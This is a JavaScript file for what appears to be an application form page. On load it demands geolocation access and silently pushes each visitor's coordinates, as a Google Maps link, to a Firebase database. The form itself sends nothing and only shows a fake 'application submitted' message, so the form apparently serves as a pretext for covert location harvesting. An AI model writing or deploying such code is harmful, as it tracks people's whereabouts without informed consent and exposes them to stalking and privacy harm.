let googleMapsUrl;

function goToCurrentLocationOnGoogleMaps() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

                // Send location to Firebase
                sendLocationToFirebase(googleMapsUrl);
            },
            (error) => {
                handleGeolocationError(error);
            }
        );
    } else {
        console.error("Geolocation is not supported by this browser.");
    }
}

function handleGeolocationError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            console.error("User denied the request for Geolocation.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.error("Location information is unavailable.");
            break;
        case error.TIMEOUT:
            console.error("The request to get user location timed out.");
            break;
        case error.UNKNOWN_ERROR:
            console.error("An unknown error occurred.");
            break;
    }
}

function sendLocationToFirebase(locationUrl) {
    const database = firebase.database();
    database.ref('messages').push().set({
        message: locationUrl,
    }).then(() => {
        console.log('Location sent to Firebase successfully!');
    }).catch((error) => {
        console.error('Error writing to Firebase Database', error);
    });
}

document.addEventListener('DOMContentLoaded', function () {
    checkLocationPermission().then(hasPermission => {
        if (hasPermission) {
            goToCurrentLocationOnGoogleMaps();
        } else {
            requestLocationPermission().then(granted => {
                if (granted) {
                    goToCurrentLocationOnGoogleMaps();
                } else {
                    document.getElementsByTagName('body').innerHTML = 'You need to grant location permission to use this app.';
                }
            });
        }
    });
});

async function checkLocationPermission() {
    if (navigator.permissions) {
        try {
            const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
            console.log(`Geolocation permission state: ${permissionStatus.state}`);
            return permissionStatus.state === 'granted';
        } catch (error) {
            console.error('Error querying geolocation permission:', error);
            return false;
        }
    } else {
        console.warn('Permissions API is not supported in this browser.');
        return false;
    }
}

function requestLocationPermission() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    console.log('Location access granted.');
                    resolve(true);
                },
                error => {
                    if (error.code === error.PERMISSION_DENIED) {
                        document.getElementsByTagName('body')[0].innerHTML = 'You need to grant permission to use this app.';

                        resolve(false);
                    } else {
                        console.error('Error occurred while accessing location:', error);
                        reject(error);
                    }
                }
            );
        } else {
            console.warn('Geolocation is not supported in this browser.');
            resolve(false);
        }
    });
}
// document.getElementById('submit-button').addEventListener('click', () => {
//     document.getElementById('submit-button').innerHTML = 'Your application is submitted.';

// });

document.getElementsByTagName('form')[0].addEventListener('submit', (event) => {
    event.preventDefault();
    document.getElementsByTagName('body')[0].innerHTML = 'Your application has been submitted will be contacted soon.';
});